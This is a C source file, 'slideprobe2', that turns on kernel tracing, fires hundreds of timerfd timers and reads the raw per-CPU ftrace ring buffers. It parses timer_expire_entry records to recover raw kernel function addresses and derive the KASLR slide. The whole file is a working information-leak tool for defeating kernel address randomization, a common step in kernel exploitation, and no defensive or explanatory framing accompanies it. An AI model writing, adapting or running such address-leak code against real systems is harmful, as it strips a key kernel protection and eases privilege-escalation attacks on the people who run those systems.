/*
 * slideprobe2 - derive the KASLR slide from timer_expire_entry raw records.
 *
 * timer_expire_entry payload: common(8) timer(8) now(8) function(8)
 * -> `function` sits at payload+24, i.e. record+28 (4-byte ring header).
 * The text form prints %ps (symbol only); the raw record keeps the address.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <stdint.h>
#include <sys/timerfd.h>
#include <time.h>

#define T "/sys/kernel/tracing"
#define KVA_TEXT 0xffffff8000000000ULL
#define KVA_TEXT_END 0xfffffffec0000000ULL

static int write_str(const char *path, const char *val)
{
    int fd = open(path, O_WRONLY);
    ssize_t n;
    if (fd < 0) return -1;
    n = write(fd, val, strlen(val));
    close(fd);
    return n > 0 ? 0 : -1;
}

int main(void)
{
    int fds[16], nfds = 0, i, tfds[256], ntf = 0;
    unsigned char buf[1 << 16];
    unsigned char *all = malloc(1 << 22);
    size_t total = 0;
    struct itimerspec its;

    if (!all) return 1;
    write_str(T "/tracing_on", "0\n");
    { int fd = open(T "/trace", O_WRONLY | O_TRUNC); if (fd >= 0) close(fd); }
    write_str(T "/tracing_on", "1\n");

    for (i = 0; i < 16; i++) {
        char p[128];
        snprintf(p, sizeof(p), T "/per_cpu/cpu%d/trace_pipe_raw", i);
        fds[nfds] = open(p, O_RDONLY | O_NONBLOCK);
        if (fds[nfds] < 0) break;
        nfds++;
    }
    printf("raw pipes: %d\n", nfds);

    memset(&its, 0, sizeof(its));
    its.it_value.tv_nsec = 1000000L;   /* 1 ms, one shot */
    for (i = 0; i < 256; i++) {
        int fd = timerfd_create(CLOCK_MONOTONIC, TFD_NONBLOCK);
        if (fd < 0) break;
        if (timerfd_settime(fd, 0, &its, NULL) != 0) { close(fd); break; }
        tfds[ntf++] = fd;
    }
    printf("timerfds armed: %d\n", ntf);

    {
        int rounds;
        for (rounds = 0; rounds < 120; rounds++) {
            struct pollfd pfd[16];
            int k;
            for (k = 0; k < nfds; k++) { pfd[k].fd = fds[k]; pfd[k].events = POLLIN; }
            if (poll(pfd, nfds, 30) > 0) {
                for (k = 0; k < nfds; k++) {
                    if (pfd[k].revents & POLLIN) {
                        ssize_t n = read(fds[k], buf, sizeof(buf));
                        if (n > 0 && total + (size_t)n < (1u << 22)) {
                            memcpy(all + total, buf, (size_t)n);
                            total += (size_t)n;
                        }
                    }
                }
            }
            if (rounds == 40) {   /* re-arm so expiries keep coming */
                for (i = 0; i < ntf; i++) timerfd_settime(tfds[i], 0, &its, NULL);
            }
        }
    }
    write_str(T "/tracing_on", "0\n");
    for (i = 0; i < nfds; i++) close(fds[i]);
    for (i = 0; i < ntf; i++) close(tfds[i]);
    printf("captured %zu bytes\n", total);

    {
        size_t o;
        printf("--- first 160 bytes ---\n");
        for (o = 0; o < 160 && o < total; o += 16) {
            int k;
            printf("%04zu: ", o);
            for (k = 0; k < 16 && o + k < total; k++) printf("%02x ", all[o + k]);
            printf("\n");
        }
        printf("--- type_len histogram (naive walk) ---\n");
        {
            int hist[32] = {0};
            int k;
            size_t q = 0;
            int n = 0;
            while (q + 4 <= total && n < 400) {
                uint32_t hdr; uint32_t tl;
                memcpy(&hdr, all + q, 4);
                tl = hdr & 0x1f;
                hist[tl]++;
                n++;
                if (tl >= 3 && tl <= 28) q += tl * 4;
                else if (tl == 31) q += 8 + 4;
                else q += 8;
            }
            for (k = 0; k < 32; k++) if (hist[k]) printf("  type_len=%2d count=%d\n", k, hist[k]);
        }
    }

    /* Walk ring-buffer records: u32 header, bits[0:5] = type_len (words). */
    {
        size_t off = 0;
        int hits = 0, seen36 = 0;
        while (off + 8 <= total) {
            uint32_t hdr;
            uint32_t tlen, len, poff;
            memcpy(&hdr, all + off, 4);
            tlen = hdr & 0x1f;
            if (tlen == 0) {                 /* padding: length in next word */
                uint32_t plen;
                memcpy(&plen, all + off + 4, 4);
                len = plen ? plen : 4;
                off += len;
                continue;
            }
            if (tlen == 1) { off += 8; continue; }        /* time extend */
            if (tlen == 2) { off += 8; continue; }        /* time stamp */
            if (tlen == 31) {
                memcpy(&len, all + off + 4, 4);
                poff = 4;
                len += 4;
            } else {
                len = tlen * 4;
                poff = 0;
            }
            if (len < 12 || off + len > total) break;
            if (len == 36) {                              /* timer_expire_entry */
                uint64_t fn;
                seen36++;
                memcpy(&fn, all + off + poff + 4 + 24, 8);
                if (fn >= KVA_TEXT && fn < KVA_TEXT_END) {
                    printf("function=0x%016llx  (record off=%zu)\n",
                           (unsigned long long)fn, off);
                    if (++hits >= 8) break;
                }
            }
            off += len;
        }
        printf("records len=36 seen: %d, kernel-text functions: %d\n", seen36, hits);
        {
            size_t q; int shown2 = 0;
            printf("--- all 4-aligned text-range values (up to 24) ---\n");
            for (q = 0; q + 8 <= total && shown2 < 24; q += 4) {
                uint64_t v;
                memcpy(&v, all + q, 8);
                if (v >= 0xffffff8000000000ULL && v < 0xfffffffec0000000ULL) {
                    printf("0x%016llx\n", (unsigned long long)v);
                    shown2++;
                }
            }
        }
    }
    return 0;
}
